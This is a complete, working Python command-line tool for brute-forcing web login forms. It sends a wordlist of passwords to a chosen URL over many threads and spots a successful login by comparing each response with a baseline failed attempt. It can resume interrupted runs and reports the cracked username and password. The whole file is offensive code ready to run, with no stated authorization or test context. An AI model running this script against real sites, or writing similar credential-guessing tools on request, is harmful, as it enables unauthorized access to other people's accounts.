#!/usr/bin/env python3
import argparse
import json
import os
import requests
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import time
from tabulate import tabulate

resume_file = ".resume_http.json"
attempt_counter = 0
counter_lock = threading.Lock()

def get_baseline(url, username):
    try:
        resp = requests.post(url, data={"username": username, "password": "invalid_password"}, timeout=5)
        return {
            "text": resp.text,
            "status_code": resp.status_code,
            "length": len(resp.content),
            "url": resp.url
        }
    except requests.RequestException as e:
        print(f"[!] Could not get baseline: {e}")
        exit(1)

def is_password_correct(response, baseline, mode):
    if mode == "text":
        return response.text != baseline["text"]
    elif mode == "code":
        return response.status_code != baseline["status_code"]
    elif mode == "length":
        return len(response.content) != baseline["length"]
    elif mode == "all":
        return (
            response.text != baseline["text"] or
            response.status_code != baseline["status_code"] or
            len(response.content) != baseline["length"] or
            response.url != baseline["url"]
        )
    return False

def attempt_login(url, username, password, baseline, mode, verbose, found_event):
    global attempt_counter
    if found_event.is_set():
        return False
    try:
        response = requests.post(url, data={"username": username, "password": password}, timeout=5)

        with counter_lock:
            attempt_counter += 1

        if verbose:
            print(f"[-] Tried: {password}")
            if mode == "all":
                table = [
                    ["Status Code", response.status_code, baseline['status_code']],
                    ["Content Length", len(response.content), baseline['length']],
                    ["Text Diff", 'DIFFERENT' if response.text != baseline['text'] else 'Same', 'Expected'],
                    ["Redirect URL", response.url, baseline['url']]
                ]
                print(tabulate(table, headers=["Check", "Response", "Baseline"]))

        if is_password_correct(response, baseline, mode):
            print(f"\n[✅] Password found: {username}:{password}")
            found_event.set()
            return password
    except requests.RequestException as e:
        print(f"[!] Error trying {password}: {e}")
    return False

def save_resume(last_pass):
    with open(resume_file, "w") as f:
        json.dump({"last_tried": last_pass}, f)

def load_resume():
    if os.path.exists(resume_file):
        with open(resume_file) as f:
            return json.load(f).get("last_tried", None)
    return None

def threaded_bruteforce(url, username, wordlist, threads, mode, verbose):
    global attempt_counter
    found_event = threading.Event()
    start_time = time.time()

    last_tried = load_resume()
    skip = True if last_tried else False

    with open(wordlist, 'r') as f:
        passwords = [line.strip() for line in f if line.strip()]

    if skip:
        index = passwords.index(last_tried) if last_tried in passwords else 0
        passwords = passwords[index + 1:]

    print(f"[🔁] Resuming after: {last_tried}" if last_tried else f"[🚀] Starting fresh...")
    baseline = get_baseline(url, username)

    cracked_password = None

    with ThreadPoolExecutor(max_workers=int(threads)) as executor:
        futures = {
            executor.submit(attempt_login, url, username, pwd, baseline, mode, verbose, found_event): pwd
            for pwd in passwords
        }

        for future in as_completed(futures):
            pwd = futures[future]
            save_resume(pwd)
            result = future.result()
            if result:
                cracked_password = result
                break

    duration = time.time() - start_time
    if cracked_password:
        print(f"\n[🔐] Cracked: {username}:{cracked_password}")
        print(f"[🔢] Attempts: {attempt_counter}")
        print(f"[⏱️] Time taken: {duration:.2f} seconds")
        try:
            os.remove(resume_file)
        except FileNotFoundError:
            pass
    else:
        print(f"\n[-] Brute-force finished. Password not found.")
        print(f"[🔢] Attempts: {attempt_counter}")
        print(f"[⏱️] Time taken: {duration:.2f} seconds")

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("--url", required=True)
    parser.add_argument("--username", required=True)
    parser.add_argument("--wordlist", required=True)
    parser.add_argument("--threads", default="10")
    parser.add_argument("--mode", choices=["text", "code", "length", "all"], default="all")
    parser.add_argument("--verbose", action="store_true")
    args = parser.parse_args()

    threaded_bruteforce(args.url, args.username, args.wordlist, int(args.threads), args.mode, args.verbose)
